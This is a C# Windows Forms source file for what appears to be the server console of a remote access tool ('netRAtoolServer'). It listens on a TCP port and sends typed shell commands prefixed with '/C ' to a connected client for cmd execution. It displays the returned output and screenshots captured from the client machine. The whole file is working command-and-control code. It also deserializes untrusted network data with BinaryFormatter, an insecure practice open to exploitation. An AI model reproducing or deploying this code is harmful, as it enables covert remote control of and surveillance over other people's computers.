using System;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing;

namespace netRAtoolServer
{
    public partial class Form1 : Form
    {
        private int portServ;
        private TcpClient client;
        private TcpListener server;

        private bool threadON;
        private Thread Listening;
        private Thread GetData;
        BinaryFormatter binFormatter;

        public Form1()
        {
            InitializeComponent();
        }

        private void StartListening()
        {
            while (!client.Connected)
            {
                server.Start();
                client = server.AcceptTcpClient();
            }

            threadON = true;
            GetData.Start();

            if (this.listBox2.InvokeRequired)
            {
                this.Invoke(new Action(() => listBox2.Items.Add("# Thread StartListening is finish")));
            }
        }

        private void ReciveDataFromClient()
        {
            BinaryFormatter binFormatterRecive = new BinaryFormatter();
            String whatDataClientSend;
            NetworkStream mainStream;

            while (client.Connected && threadON)
            {
                mainStream = client.GetStream();

                try
                {
                    whatDataClientSend = (String)binFormatterRecive.Deserialize(mainStream);
                    if (whatDataClientSend.StartsWith("img"))
                    {
                        try
                        {
                            mainStream = client.GetStream();
                            pictureBox1.Image = (Image)binFormatterRecive.Deserialize(mainStream);
                        }
                        catch (Exception)
                        {
                            ;
                        }
                    }
                    else
                    {
                        mainStream = client.GetStream();
                        whatDataClientSend = (String)binFormatterRecive.Deserialize(mainStream);
                        if (this.listBox1.InvokeRequired)
                        {
                            this.Invoke(new Action(() => listBox1.Items.Add(whatDataClientSend)));
                        }
                    }
                }
                catch
                {
                    if (this.listBox1.InvokeRequired)
                    {
                        this.Invoke(new Action(() => listBox2.Items.Add("# Thread ReciveDataFromClient: Client close")));
                    }

                    if (this.button2.InvokeRequired)
                    {
                        this.Invoke(new Action(() => button2.PerformClick()));
                    }
                }
            }

            if (this.listBox2.InvokeRequired)
            {
                this.Invoke(new Action(() => listBox2.Items.Add("# Thread ReciveDataFromClient is finish")));
            }

            if (this.button2.InvokeRequired)
            {
                this.Invoke(new Action(() => button2.PerformClick()));
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (button1.Text.StartsWith("Listen"))
            {
                try
                {
                    portServ = Int32.Parse(textBox1.Text);
                    client = new TcpClient();
                    server = new TcpListener(IPAddress.Any, portServ);
                    binFormatter = new BinaryFormatter();
                    Listening = new Thread(StartListening);
                    GetData = new Thread(ReciveDataFromClient);

                    Listening.Start();

                    button1.Text = "Execute command";
                    textBox2.Visible = true;
                    button2.Visible = true;
                }
                catch
                {
                    MessageBox.Show("Wrong PORT !!!!");
                }
            }
            else
            {
                String cmdInputArg = "/C ";
                cmdInputArg += textBox2.Text;
                listBox2.Items.Add(">> Try execute: " + cmdInputArg);
                textBox2.Clear();
                NetworkStream mainStream = client.GetStream();
                if(mainStream.CanWrite)
                {
                    binFormatter.Serialize(mainStream, cmdInputArg);
                    listBox2.Items.Add(">> Send");
                }
                else
                {
                    listBox2.Items.Add(">> Cannot write!!!");
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (button1.Text.StartsWith("Execute"))
            {
                server.Stop();
                client.Close();
                client = null;
                threadON = false;

                if (Listening.IsAlive) Listening.Abort();
                if (GetData.IsAlive) GetData.Abort();

                button1.Text = "Listen";
                button2.Visible = false;
                textBox2.Visible = false;
                listBox1.Items.Clear();
                pictureBox1.Image = null;
            }
        }
    }
}
